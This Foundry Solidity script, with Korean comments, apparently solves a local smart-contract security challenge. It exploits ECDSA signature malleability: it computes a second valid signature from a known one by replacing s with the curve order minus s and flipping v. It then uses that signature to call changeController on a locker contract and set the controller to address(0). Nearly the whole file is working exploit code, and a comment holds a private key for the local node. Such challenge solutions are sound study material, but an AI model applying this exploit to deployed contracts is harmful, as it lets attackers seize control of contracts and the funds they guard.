// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function lockers(uint256 index) external view returns (address);
    function lockCounter() external view returns (uint256);
}

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x24B3c7704709ed1491473F30393FFc93cFB0FC34;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        bytes32 msgHash = 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;

        // trace log에서 확인한 실제 r, s, v 값들
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 v = 27;

        address recovered = ecrecover(msgHash, v, r, s);
        console.log("Original signature recovered address:", recovered);

        // signature malleability 시도 이후 ecrecover 함수 호출 후 address 출력
        bytes32 secp256k1Order = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        bytes32 malleableS = bytes32(uint256(secp256k1Order) - uint256(s));
        uint8 malleableV = v == 27 ? 28 : 27;

        address malleableRecovered = ecrecover(msgHash, malleableV, r, malleableS);
        console.log("Malleable signature recovered address:", malleableRecovered);
        address lockContract = ITarget(target).lockers(0); // 첫 번째 lock
        console.log("Lock contract address:", lockContract);
        
        // 현재 controller 확인
        address currentController = IECLocker(lockContract).controller();
        console.log("Current controller:", currentController);
        
        // malleable signature로 changeController 호출하여 controller를 address(0)으로 변경
        if (malleableRecovered == recovered) {
            console.log("Using malleable signature to change controller to address(0)");
            IECLocker(lockContract).changeController(malleableV, r, malleableS, address(0));
            console.log("Controller changed to address(0) successfully!");
            
            // 변경된 controller 확인
            address newController = IECLocker(lockContract).controller();
            console.log("New controller:", newController);
        } else {
            console.log("Malleable signature generates different address, cannot proceed");
        }

        vm.stopBroadcast();
    }
}